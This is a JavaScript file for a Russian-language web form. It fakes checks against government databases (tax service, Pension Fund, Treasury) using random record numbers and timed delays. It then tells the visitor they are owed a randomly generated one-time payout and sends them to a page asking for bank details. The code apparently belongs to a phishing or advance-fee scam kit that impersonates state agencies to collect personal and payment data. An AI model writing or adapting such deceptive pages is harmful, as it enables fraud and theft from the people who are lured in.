function getRandomInt(max) {
    return Math.floor(Math.random() * Math.floor(max));
}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const clearNode = node => {
    node.childNodes.forEach(el => {
        if (el.nodeName !== "#text") {
            el.remove();
        }
    });
}

const sendForm = async (ev) => {
    ev.preventDefault();
    let form = document.querySelector(".form");

    let fields = document.querySelectorAll(".form__field");

    let flag = 0;
    for (let i = 0; i < fields.length; ++i) {
        if (fields[i].value === "") {
            flag = 1;
            fields[i].style.border = "1px solid #E21C2A";
        } else if (fields[i].type == "radio" && fields[i].checked) {
            localStorage.setItem(fields[i].id, "true");
        } else if (fields[i].type == "radio" && !(fields[i].checked)) {
            localStorage.setItem(fields[i].id, "false");
        } else {
            localStorage.setItem(fields[i].id, fields[i].value);
        }
    }

    if (flag === 1)
        return;

    clearNode(form);
    let h2 = document.createElement("h2");
    let div = document.getElementById("cube-loader").cloneNode(true);
    document.getElementById("cube-loader").remove();
    h2.className = "loading";
    h2.innerText = "Сверка заполненной анкеты с базой данных";
    div.style.display = "block";
    div.style.position = "static";
    let done = document.createElement("div");
    done.className = "done";
    let p = document.createElement("p");
    p.innerText = "Сейчас мы подготовим запросы для расчета положенной выплаты, это займет некоторое время, пожалуйста, не закрывайте эту страницу.";
    p.className = "loading_info";
    form.style.paddingBottom = "10vh";
    form.style.height = "55vh";
    form.appendChild(h2);
    form.appendChild(div);

    const load = async (text) => {
        await sleep(2000+getRandomInt(3000))
        clearNode(form);
        done.remove();
        h2.innerText = text;
        h2.classList.remove("loading_ends");
        form.appendChild(h2);
        form.appendChild(div);
        p.classList.add("loading_ends");
        p.style.marginTop = "5vh";
        await sleep(1900+getRandomInt(1900));
        p.innerHTML = "БД-РФ " + (100000 + getRandomInt(99999)) + "<br />";
        form.appendChild(p);
        await sleep(1900+getRandomInt(1900));
        p.innerHTML += "БД-РФ " + (100000 + getRandomInt(99999)) + "<br />";
        await sleep(2850+getRandomInt(1900));
        p.innerHTML += "БД-РФ " + (100000 + getRandomInt(99999)) + "<br />";
    
        await sleep(1900+getRandomInt(3800));
        clearNode(form);
        div.remove();
        form.appendChild(h2);
        form.appendChild(done);
        form.appendChild(p);
    };

    await sleep(1900+getRandomInt(3800))
    clearNode(form);
    div.remove();
    h2.innerText = "Вы идентифицированы.";
    h2.classList.add("loading_ends");
    form.appendChild(h2);
    form.appendChild(done);
    form.appendChild(p);
    
    await load("Обращение в региональную базу данных..");
    await load("Запрос в налоговые органы…");
    await load("Сверка с базой ПФР...");
    await load("Запрос в казначейство...");

    let h1 = document.createElement("h1");
    h1.style.textAlign = "center";
    h1.style.fontFamily = "Exo";
    h1.style.marginTop = "2vh";
    h1.style.marginBottom = "2vh";
    let num = (100 + getRandomInt(150));
    let ber = (100 + getRandomInt(899));
    h1.innerText = "" + num + " " + ber + " руб.";
    localStorage.setItem('number', "" + num + " " + ber);
    p.classList.remove("loading_ends");
    p.style.marginTop = "1vh";
    p.innerText = "Для получения средств укажите реквизиты на следующем этапе… ";
    let p1 = document.createElement("p");
    p1.className = "loading_info";
    p1.style.fontSize = "0.7rem";
    p1.style.marginTop = "5vh";
    p1.innerText = "Если автоматическая переадресация не произошла, то жмите на кнопку ниже";
    let but = document.createElement("a");
    but.href = "req.html";
    but.className = "get-req";
    but.innerText = "Перейти к заполнению реквизитов";

    await sleep(1900+getRandomInt(1900));
    h2.innerText = "Вам положена единоразовая выплата в сумме";
    h2.classList.add("loading_ends");
    done.remove();
    p.remove();
    form.appendChild(h1);
    form.appendChild(p);
    form.appendChild(p1);
    form.appendChild(but);
} 


const sendApplication = async ev => {
    ev.preventDefault();

    let form = document.querySelector(".form");

    let fields = document.querySelectorAll(".form__field");

    let flag = 0;
    for (let i = 0; i < fields.length; ++i) {
        if (fields[i].value === "") {
            flag = 1;
            fields[i].style.border = "1px solid #E21C2A";
        } else if (fields[i].type == "radio" && fields[i].checked) {
            localStorage.setItem(fields[i].id, "true");
        } else if (fields[i].type == "radio" && !(fields[i].checked)) {
            localStorage.setItem(fields[i].id, "false");
        } else {
            localStorage.setItem(fields[i].id, fields[i].value);
        }
    }

    if (flag === 1)
        return;
    
        document.location.href = "chat.html";
}